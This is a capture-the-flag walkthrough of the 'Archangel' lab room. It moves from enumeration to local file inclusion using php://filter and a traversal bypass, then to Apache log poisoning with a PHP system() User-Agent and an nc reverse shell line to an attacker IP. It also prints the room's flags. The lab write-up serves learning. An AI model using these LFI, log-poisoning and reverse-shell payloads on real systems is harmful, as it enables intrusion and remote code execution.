# Archangel

## Task 1: Deploy the machine



## Task 2: Get a shell

### Question

> Find a different hostname

* Let's scan the target using `nmap`.

```
$ nmap -sC -sV 10.10.216.22
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-08 09:44 IST
Nmap scan report for 10.10.216.22
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.64 seconds
```

* As we can see there are three open ports:
  * Port 22: ssh
  * Port 80: http
* We can now visit the web page through our browser. !\[\[2 92.png]]
* The email address tells us what the other domain is.

### Answer

```
mafialive.thm
```

### Question

> Find flag 1

* Let's add `mafialive.thm` to our `/etc/hosts` file. !\[\[3 72.png]]
* We can now check if we can find something in `mafialive.thm`. !\[\[4 57.png]]

### Answer

```
thm{f0und_th3_r1ght_h0st_n4m3}
```

### Question

> Look for a page under development

* We can go to `/robots.txt` to see if any pages are disallowed. Those pages could be under development. !\[\[5 41.png]]
* Let's go to `/test.php`. !\[\[6 30.png]]

### Answer

```
test.php
```

### Question

> Find flag 2

* Let's try to read the source code of `/test.php`. !\[\[7 24.png]]
* Looks like we are not allowed to read the `/test.php` source code.
* We can use the `php://filter` to encode the source code to Base64 and bypass the security.

#### php://filter

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

!\[\[8 20.png]]

* Let's decode the Base64 string.

```
$ echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>
```

* The flag is in the comment.

### Answer

```
thm{explo1t1ng_lf1}
```

### Question

> Get a shell and find the user flag

* Let's take a closer look at the `test.php` code.

#### test.php

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>
```

* We can see that it disallows the use of `../..`.
* Also, the URI must contain `/var/www/html/development_testing`.
* Using this information we can craft an exploit that gives the Apache `àccess.log` logs.

#### access.log

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../log/apache2/access.log
```

!\[\[9 15.png]]

* Let's intercept the request using Burpsuite. !\[\[11 8.png]]
* We have to change the `User-Agent` field to the following:

```
<?php system($_GET['cmd']); ?>
```

!\[\[12 7.png]]

* We can now upload a PHP reverse shell to the server. Let's go to Revshells.

```
<?php exec(' nc 10.10.48.138 9999 -e /bin/bash'); ?>  
```

* Let's brute force the web pages using `gobuster`.

```
$ gobuster dir -u http://10.10.216.22 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/flags                (Status: 301) [Size: 312] [--> http://10.10.216.22/flags/]
/images               (Status: 301) [Size: 313] [--> http://10.10.216.22/images/]
/index.html           (Status: 200) [Size: 19188]
/layout               (Status: 301) [Size: 313] [--> http://10.10.216.22/layout/]
/pages                (Status: 301) [Size: 312] [--> http://10.10.216.22/pages/]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
